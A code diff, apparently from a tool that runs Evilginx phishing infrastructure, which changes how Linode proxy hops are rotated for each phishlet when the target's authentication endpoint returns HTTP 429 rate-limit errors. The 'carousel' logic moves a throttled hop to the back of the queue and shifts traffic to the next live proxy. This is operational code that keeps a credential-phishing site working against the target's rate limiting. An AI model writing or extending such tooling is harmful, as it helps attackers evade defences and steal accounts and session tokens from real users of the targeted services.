@@ -711,16 +711,20 @@ def _live_assigned_ids(s, assigned):
 
 
 def record_auth_429(phishlet, host="", path=""):
-    """Count only auth-challenge 429s. Never destroys a Linode. Never detaches a proxy that is not live.
+    """Origin HTTP 429 from the evilginx hook. Never destroys a Linode.
 
-    Carousel (per phishlet): after HIT_LIMIT, current hop goes to the end of the
-    assignment queue and stays assigned. Off: current hop is detached from the phishlet.
+    Carousel ON (per phishlet): after HIT_LIMIT, current hop goes to the end of
+    the assignment queue and stays assigned; traffic switches to the next live hop.
+    Carousel OFF: ignore — keep the assigned hop(s). Do not detach, rotate, or
+    fall back to the Evilginx server IP.
     """
     with _lock:
         s = load()
         pl = phishlet or domain_to_phishlet(host)
         if not pl:
             return {"ok": True, "ignored": True}
+        if not bool((s.get("carousel") or {}).get(pl)):
+            return {"ok": True, "ignored": True, "reason": "carousel off"}
         px_id = _as_id((s.get("current") or {}).get(pl))
         rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == px_id), None)
         if not rec or rec.get("status") != "active":
@@ -735,69 +739,42 @@ def record_auth_429(phishlet, host="", path=""):
             return {"ok": True, "hits": len(hits), "limit": HIT_LIMIT}
 
         assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(pl) or []]
-        carousel = bool((s.get("carousel") or {}).get(pl))
         ip = rec.get("ipv4") or str(px_id)
 
-        if carousel:
-            if px_id in assigned:
-                assigned = [i for i in assigned if i != px_id] + [px_id]
-            s.setdefault("assignments", {})[pl] = assigned
-            live = _live_assigned_ids(s, assigned)
-            nxt = next((i for i in live if i != px_id), None)
-            if nxt is None:
-                nxt = live[0] if live else None
-            s.setdefault("current", {})[pl] = nxt
-            s["hits"][key] = []
-            save(s)
-            if nxt and nxt != px_id:
-                drop_proxy_tunnels([px_id])
-            nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None) if nxt else None
-            nxt_ip = (nxtp or {}).get("ipv4") or nxt
-            if _notify:
-                if nxt and nxt != px_id:
-                    _notify(
-                        "Proxy carousel",
-                        f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. Moved to end of queue (still assigned). Now using {nxt_ip}.",
-                        "warning",
-                    )
-                elif nxt == px_id:
-                    _notify(
-                        "Proxy carousel",
-                        f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. No other live hop in the queue — staying on {ip}.",
-                        "warning",
-                    )
-                else:
-                    _notify(
-                        "Proxy pool empty",
-                        f"Phishlet {pl}: no live assigned proxies. Traffic uses the Evilginx server IP.",
-                        "error",
-                    )
-            return {"ok": True, "rotated": True, "carousel": True, "detached": None, "previous": px_id, "next": nxt}
-
         if px_id in assigned:
-            assigned.remove(px_id)
+            assigned = [i for i in assigned if i != px_id] + [px_id]
         s.setdefault("assignments", {})[pl] = assigned
-        nxt = assigned[0] if assigned else None
+        live = _live_assigned_ids(s, assigned)
+        nxt = next((i for i in live if i != px_id), None)
+        if nxt is None:
+            nxt = live[0] if live else None
         s.setdefault("current", {})[pl] = nxt
         s["hits"][key] = []
         save(s)
-        drop_proxy_tunnels([px_id])
-
+        if nxt and nxt != px_id:
+            drop_proxy_tunnels([px_id])
+        nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None) if nxt else None
+        nxt_ip = (nxtp or {}).get("ipv4") or nxt
         if _notify:
-            if nxt:
-                nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None)
+            if nxt and nxt != px_id:
                 _notify(
-                    "Proxy rotated",
-                    f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. Detached (instance kept). Now using {(nxtp or {}).get('ipv4') or nxt}.",
+                    "Proxy carousel",
+                    f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. Moved to end of queue (still assigned). Now using {nxt_ip}.",
+                    "warning",
+                )
+            elif nxt == px_id:
+                _notify(
+                    "Proxy carousel",
+                    f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. No other live hop in the queue — staying on {ip}.",
                     "warning",
                 )
             else:
                 _notify(
                     "Proxy pool empty",
-                    f"Phishlet {pl}: all assigned proxies exhausted. Traffic uses the Evilginx server IP.",
+                    f"Phishlet {pl}: no live assigned proxies. Traffic uses the Evilginx server IP.",
                     "error",
                 )
-        return {"ok": True, "rotated": True, "carousel": False, "detached": px_id, "next": nxt}
+        return {"ok": True, "rotated": True, "carousel": True, "detached": None, "previous": px_id, "next": nxt}
 
 
 def ensure_evilginx_sidecar_proxy():
@@ -908,7 +885,7 @@ def live_fingerprint(snap):
 
 
 def set_carousel(phishlet, enabled):
-    """Per-phishlet 429 mode: True = round-robin without detach."""
+    """Per-phishlet 429 mode: True = round-robin. False = 429 does not rotate."""
     with _lock:
         s = load()
         s.setdefault("carousel", {})[phishlet] = bool(enabled)
